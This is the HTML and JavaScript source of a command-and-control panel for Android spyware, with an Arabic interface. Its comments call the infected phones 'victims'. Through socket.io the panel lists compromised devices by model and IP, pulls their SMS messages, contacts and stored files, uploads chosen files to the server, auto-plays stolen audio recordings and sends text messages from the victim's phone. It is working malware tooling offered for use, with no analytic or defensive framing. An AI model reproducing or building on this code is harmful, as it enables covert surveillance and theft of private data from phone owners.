<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Control Panel v3.5 | Auto-Play Mode</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css">
    
    <style>
        :root { --bg-dark: #0f172a; --card-bg: #1e293b; --accent: #38bdf8; }
        body { background-color: var(--bg-dark); color: #f1f5f9; font-family: 'Segoe UI', Tahoma, sans-serif; overflow-x: hidden; }
        
        /* Layout */
        .main-header { border-bottom: 1px solid #334155; padding: 15px 0; margin-bottom: 30px; background: #111827; }
        .card { background: var(--card-bg); border: 1px solid #334155; border-radius: 12px; height: 100%; }
        
        /* Victim Table */
        .table { color: #f1f5f9; margin-bottom: 0; }
        .table tr { border-bottom: 1px solid #334155; }
        .badge-online { background: #10b981; width: 10px; height: 10px; display: inline-block; border-radius: 50%; margin-left: 5px; }

        /* Data Viewer */
        #data-view { min-height: 500px; max-height: 700px; overflow-y: auto; background: #0f172a; border-radius: 8px; padding: 20px; }

        /* Audio Player Style */
        .audio-player-box { background: #075985; padding: 15px; border-radius: 10px; margin-bottom: 20px; border: 1px solid #38bdf8; }

        /* SMS & Contacts */
        .contact-card { background: #2d3748; border-radius: 8px; padding: 12px; margin-bottom: 10px; display: flex; align-items: center; border-right: 4px solid var(--accent); }
        .contact-icon { width: 40px; height: 40px; background: #4a5568; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-left: 15px; font-weight: bold; }
        .sms-container { display: flex; flex-direction: column; gap: 12px; }
        .sms-bubble { max-width: 85%; padding: 12px; border-radius: 15px; background: #2d3748; border: 1px solid #4a5568; align-self: flex-start; }
        .sms-sender { font-weight: bold; color: var(--accent); display: block; font-size: 13px; margin-bottom: 4px; }
        .company-msg { border-right: 4px solid #ef4444; }

        /* File Manager */
        .file-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(110px, 1fr)); gap: 15px; }
        .file-item { text-align: center; cursor: pointer; padding: 10px; border-radius: 8px; transition: 0.2s; }
        .file-item:hover { background: #334155; }
        .file-icon { font-size: 35px; margin-bottom: 5px; }
        .dir-color { color: #fbbf24; }
        .file-color { color: #94a3b8; }
        .apk-color { color: #4ade80; }

        /* Utils */
        #log-window { background: #000; height: 150px; overflow-y: auto; font-family: monospace; font-size: 12px; color: #4ade80; padding: 10px; border-radius: 8px; }
        .sms-body, .fw-bold, .file-name { color: #fff; }
        .text-muted { color: rgb(181 184 187) !important; }
    </style>
</head>
<body>

<div class="main-header shadow-sm">
    <div class="container-fluid d-flex justify-content-between align-items-center">
        <h4 class="m-0 text-info"><i class="bi bi-cpu"></i> لوحة التحكم المركزية <small class="text-muted" style="font-size: 10px;">v3.5</small></h4>
        <div id="connection-status"><span class="badge-online"></span> السيرفر متصل</div>
    </div>
</div>

<div class="container-fluid px-4">
    <div class="row g-4">
        <div class="col-lg-5">
            <div class="card p-3 shadow">
                <h5 class="mb-3"><i class="bi bi-phone"></i> الأجهزة المتصلة</h5>
                <div class="table-responsive">
                    <table class="table align-middle">
                        <thead>
                            <tr>
                                <th>الجهاز</th>
                                <th>العنوان IP</th>
                                <th>الأوامر</th>
                            </tr>
                        </thead>
                        <tbody id="victim-list"></tbody>
                    </table>
                </div>
            </div>
            
            <div class="card p-3 shadow mt-4">
                <h5><i class="bi bi-terminal"></i> السجلات</h5>
                <div id="log-window"></div>
            </div>
        </div>

        <div class="col-lg-7">
            <div id="audio-anchor"></div>

            <div class="card shadow">
                <div class="card-header border-secondary bg-transparent d-flex justify-content-between align-items-center">
                    <h5 class="m-0" id="view-title">مستعرض البيانات</h5>
                    <div id="view-controls"></div>
                </div>
                <div id="data-view">
                    <div class="text-center mt-5 text-muted">
                        <i class="bi bi-cloud-download" style="font-size: 50px;"></i>
                        <p class="mt-3">اختر جهازا ثم حدد نوع البيانات المطلوب سحبها</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script src="/socket.io/socket.io.js"></script>
<script>
    const socket = io();
    let currentTargetId = null;

    // 1. تحديث قائمة الضحايا
    socket.on('update_victims', (victims) => {
        const list = document.getElementById('victim-list');
        list.innerHTML = '';
        
        if (Object.keys(victims).length === 0) {
            list.innerHTML = '<tr><td colspan="3" class="text-center text-muted">لا توجد أجهزة متصلة</td></tr>';
            return;
        }

        for (let id in victims) {
            const v = victims[id];
            list.innerHTML += `
                <tr>
                    <td>
                        <div class="fw-bold">${v.model}</div>
                        <small class="text-muted">Android ${v.release}</small>
                    </td>
                    <td><code class="text-info">${v.ip}</code></td>
                    <td>
                        <div class="btn-group shadow-sm">
                            <button class="btn btn-sm btn-primary" onclick="setTarget('${id}', 'SMS', 'ls')"><i class="bi bi-chat-left-text"></i></button>
                            <button class="btn btn-sm btn-warning" onclick="setTarget('${id}', 'Contacts')"><i class="bi bi-person-lines-fill"></i></button>
                            <button class="btn btn-sm btn-danger" onclick="setTarget('${id}', 'Files', 'ls', '/storage/emulated/0')"><i class="bi bi-folder2-open"></i></button>
                            <button class="btn btn-sm btn-success" onclick="promptSMS('${id}')"><i class="bi bi-send"></i></button>
                        </div>
                    </td>
                </tr>`;
        }
    });

    socket.emit("upv", "");

    // 2. وظيفة إرسال الأوامر
    function setTarget(id, type, extra = '', path = '') {
        currentTargetId = id;
        document.getElementById('view-title').innerText = `طلب ${type} من الجهاز...`;
        document.getElementById('data-view').innerHTML = '<div class="text-center mt-5"><div class="spinner-border text-info"></div><p>جاري سحب البيانات...</p></div>';
        
        let orderType = type === 'Files' ? 'fileManager' : type.toLowerCase();
        socket.emit('admin_command', { targetId: id, type: orderType, extra, path });
    }

    // 3. استقبال البيانات
    socket.on('data_received', (data) => {
        const view = document.getElementById('data-view');
        const title = document.getElementById('view-title');
        title.innerText = `عرض البيانات: ${data.type}`;
        view.innerHTML = '';

        if (data.type === 'Contacts' && data.content.contactsList) {
            let html = '<div class="row">';
            data.content.contactsList.forEach(item => {
                html += `<div class="col-md-6"><div class="contact-card"><div class="contact-icon">${item.name ? item.name.charAt(0) : '?'}</div><div><div class="fw-bold">${item.name}</div><small class="text-muted">${item.phoneNo}</small></div></div></div>`;
            });
            view.innerHTML = html + '</div>';
        } 
        else if (data.type === 'SMS' && data.content.smsList) {
            let html = '<div class="sms-container">';
            data.content.smsList.forEach(item => {
                const isCompany = isNaN(item.phoneNo.replace('+', ''));
                html += `<div class="sms-bubble ${isCompany ? 'company-msg' : ''}"><span class="sms-sender">${item.phoneNo}</span><div class="sms-body">${item.msg.replace(/(https?:\/\/[^\s]+)/g, '<a href="$1" target="_blank" class="text-info">$1</a>')}</div></div>`;
            });
            view.innerHTML = html + '</div>';
        }
        else if (data.type === 'Files' && Array.isArray(data.content)) {
            let currentPath = data.content[0].path.substring(0, data.content[0].path.lastIndexOf('/')) || '/';
            document.getElementById('view-controls').innerHTML = `<span class="badge bg-dark">${currentPath}</span>`;
            let html = '<div class="file-grid">';
            data.content.forEach(item => {
                let icon = item.isDir ? 'bi-folder-fill dir-color' : (item.name.toLowerCase().endsWith('.mp3') ? 'bi-music-note-beaming text-primary' : (item.name.endsWith('.apk') ? 'bi-android2 apk-color' : 'bi-file-earmark-text file-color'));
                let action = item.isDir ? `onclick="setTarget('${currentTargetId}', 'Files', 'ls', '${item.path}')"` : `onclick="dlFile('${item.path}')"`;
                html += `<div class="file-item" ${action}><div class="file-icon"><i class="bi ${icon}"></i></div><div class="file-name text-truncate" title="${item.name}">${item.name}</div></div>`;
            });
            view.innerHTML = html + '</div>';
        }
    });

    // 4. ميزة تشغيل الصوت التلقائي بعد التحميل
    socket.on('file_ready', (data) => {
        if (data.isAudio) {
            const anchor = document.getElementById('audio-anchor');
            anchor.innerHTML = `
                <div class="audio-player-box shadow animate__animated animate__fadeInDown">
                    <div class="d-flex justify-content-between align-items-center mb-2">
                        <span class="fw-bold"><i class="bi bi-play-circle-fill"></i> جاري التشغيل: ${data.name}</span>
                        <button class="btn-close btn-close-white" onclick="this.parentElement.parentElement.remove()"></button>
                    </div>
                    <audio id="auto-player" controls autoplay src="${data.url}" style="width: 100%"></audio>
                </div>`;
            
            const player = document.getElementById('auto-player');
            player.play().catch(e => {
                const log = document.getElementById('log-window');
                log.innerHTML += `[${new Date().toLocaleTimeString()}] تنبيه: المتصفح منع التشغيل التلقائي. اضغط تشغيل يدوياً.<br>`;
            });
        }
    });

    function dlFile(path) {
        if(confirm('هل تريد تحميل هذا الملف للسيرفر؟')) {
            socket.emit('admin_command', { targetId: currentTargetId, type: 'fileManager', extra: 'dl', path });
        }
    }

    function promptSMS(id) {
        const num = prompt("رقم المستلم:");
        const msg = prompt("نص الرسالة:");
        if(num && msg) socket.emit('admin_command', { targetId: id, type: 'sms', extra: 'sendSMS', to: num, msg });
    }

    socket.on('log', msg => {
        const log = document.getElementById('log-window');
        log.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
        log.scrollTop = log.scrollHeight;
    });
</script>
</body>
</html>
